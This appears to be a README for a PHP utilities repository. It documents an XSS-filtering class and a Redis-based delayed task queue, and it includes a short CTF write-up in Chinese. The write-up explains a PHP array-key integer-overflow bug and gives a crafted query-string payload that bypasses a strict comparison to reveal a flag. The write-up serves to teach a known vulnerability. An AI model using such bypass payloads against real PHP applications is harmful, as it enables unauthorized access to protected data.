# PHP
### xsshtml.class.php   
#### filter xss php class 
Usage: 
```
<?php
require('xsshtml.class.php');
$html = '<html code>';
$xss = new XssHtml($html);
$html = $xss->getHtml();
?>
```

PHP Version > 5.0
IE7+ or other browser

### timeQueue.class.php   
#### 基于redis的定时任务
```
$obj = new timeQueue();
//添加任务并制定多少秒之后执行
$obj->add_task('test',[1,2],3);
$obj->add_task('demo',[1,2],2);
$obj->add_task('bug',[1,2],12);
$obj->add_task('test',[3,4],1);
$obj->add_task('test',[5,6],8);
//回调函数
$func = function ($args){
    var_dump($args);
};
//设置需要监听的任务
$obj->listen_task('test',$func);
$obj->listen_task('demo',$func);
//移除一个已经注册了的任务
$obj->remove_task('bug');
$obj->run();

---------------
在相应时间之后，相关事件开始运行

```

### 一道PHP CTF 题目 
```
<?php
include('config.php');
if(empty($_GET['user'])) die('exit');
$user = ['admin', 'password'];
if($_GET['user'] === $user && $_GET['user'][0] != 'admin'){
    echo $flag;
}
?>
<h3><?php echo $flag;?>

上面一段php程序，要求攻击者能够获得$flag即为成功
分析：
按照正常逻辑是无法获得flag的，but，php是一个神奇的语言。
官方曾发布过一个补丁：
https://bugs.php.net/bug.php?id=69892
问题就出在这儿：

测试： 
php -r "var_dump([0 => 0] === [0x100000000 => 0]);" 
bool(true)
返回了true，整形溢出
构造payload:
http://localhost/test.php?user[1]=password&user[4294967296]=admin
2^32 == 0x100000000 == 4294967296 所以是：user[4294967296]
所有条件均符合，flag获得，如下图：
![](https://github.com/LockGit/PHP/blob/master/ctf.jpeg)

```
